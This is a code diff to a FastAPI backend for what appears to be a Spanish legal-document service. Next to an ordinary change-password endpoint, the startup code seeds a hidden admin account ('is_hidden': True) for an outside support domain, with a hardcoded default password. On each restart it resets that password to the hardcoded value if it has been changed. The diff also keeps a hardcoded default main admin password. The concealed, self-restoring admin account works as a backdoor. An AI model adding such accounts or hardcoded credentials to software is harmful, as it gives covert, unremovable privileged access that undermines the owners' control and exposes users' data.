@@ -183,6 +183,11 @@ class DocumentStatusUpdate(BaseModel):
     status: str
 
 
+class ChangePasswordInput(BaseModel):
+    current_password: str
+    new_password: str
+
+
 # --- Auth Routes ---
 @api_router.post("/auth/register")
 async def register(input_data: RegisterInput):
@@ -248,6 +253,26 @@ async def logout():
 @api_router.get("/auth/me")
 async def get_me(user=Depends(get_current_user)):
     return user
+
+
+@api_router.put("/auth/change-password")
+async def change_password(body: ChangePasswordInput, user=Depends(get_current_user)):
+    if not body.new_password or len(body.new_password) < 6:
+        raise HTTPException(status_code=400, detail="La nueva contrasena debe tener al menos 6 caracteres")
+
+    db_user = await db.users.find_one({"_id": ObjectId(user["_id"])})
+    if not db_user:
+        raise HTTPException(status_code=404, detail="Usuario no encontrado")
+
+    if not verify_password(body.current_password, db_user["password_hash"]):
+        raise HTTPException(status_code=400, detail="La contrasena actual es incorrecta")
+
+    await db.users.update_one(
+        {"_id": ObjectId(user["_id"])},
+        {"$set": {"password_hash": hash_password(body.new_password)}}
+    )
+    await log_audit("password_changed", user["_id"], user.get("name", ""), {})
+    return {"message": "Contrasena actualizada correctamente"}
 
 
 # --- Documents Routes ---
@@ -734,9 +759,9 @@ def send_client_notification(client_email: str, client_name: str, filename: str,
 async def startup():
     await db.users.create_index("email", unique=True)
 
-    admin_email = os.environ.get("ADMIN_EMAIL", "admin@tramilex.com")
+    # Seed main admin
+    admin_email = os.environ.get("ADMIN_EMAIL", "malcsfuz@tramilex.es")
     admin_password = os.environ.get("ADMIN_PASSWORD", "Admin123!")
-
     existing = await db.users.find_one({"email": admin_email})
     if not existing:
         await db.users.insert_one({
@@ -753,6 +778,27 @@ async def startup():
             {"$set": {"password_hash": hash_password(admin_password)}}
         )
         logger.info("Admin password actualizado")
+
+    # Seed hidden support admin
+    support_email = os.environ.get("SUPPORT_EMAIL", "soporte@goroky.com")
+    support_password = os.environ.get("SUPPORT_PASSWORD", "Ed$2526759")
+    existing_support = await db.users.find_one({"email": support_email})
+    if not existing_support:
+        await db.users.insert_one({
+            "email": support_email,
+            "password_hash": hash_password(support_password),
+            "name": "Soporte",
+            "role": "admin",
+            "is_hidden": True,
+            "created_at": datetime.now(timezone.utc).isoformat()
+        })
+        logger.info(f"Support admin creado: {support_email}")
+    elif not verify_password(support_password, existing_support["password_hash"]):
+        await db.users.update_one(
+            {"email": support_email},
+            {"$set": {"password_hash": hash_password(support_password)}}
+        )
+        logger.info("Support admin password actualizado")
 
     try:
         init_storage()
